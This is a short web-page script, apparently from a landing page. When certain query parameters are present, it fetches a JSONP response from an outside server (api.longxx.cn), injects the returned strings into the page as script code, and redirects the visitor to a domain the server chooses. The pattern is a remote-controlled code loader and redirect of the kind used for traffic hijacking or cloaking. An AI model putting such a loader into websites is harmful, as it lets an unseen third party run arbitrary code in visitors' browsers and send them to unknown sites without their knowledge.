<script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
<script>
    function getQueryVariable(variable)
    {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i=0;i<vars.length;i++) {
            var pair = vars[i].split("=");
            if(pair[0] == variable){return pair[1];}
        }
        return(false);
    }
    if(!getQueryVariable('article') && !getQueryVariable('uuid') && !getQueryVariable('from')){
        
    } else{
        $.ajax({
        type:"GET",
        url:'https://api.longxx.cn/bak/lianmeng/getluodiapi.php',
        dataType:"jsonp",
        jsonp:"callback",
        success:function(res){

            loadAsyncScript(res.sys_tongji);
            loadAsyncScript(res.admin_tongji);
            loadAsyncScript(res.qudao_tongji);
            loadAsyncScript(res.tongji, location.href = res.domainname)
        },

        error: function (e) {
            console.log(e);
        }

    });

    function loadAsyncScript(src, callback = function () {
    }) { 
        const head = document.getElementsByTagName('head')[0];
        const script = document.createElement('script');
        script.setAttribute('type', 'text/javascript');
        script.setAttribute('async', true);
        script.setAttribute('defer', true);
        script.append(src);
        head.appendChild(script);
        if (script.readyState) {
            script.onreadystatechange = function () {
                var state = this.readyState;
                if (state === 'loaded' || state === 'complete') {
                    callback();
                }
            }
        } else {
            script.onload = function () {
                callback();
            }
        }
      }
    }
</script>
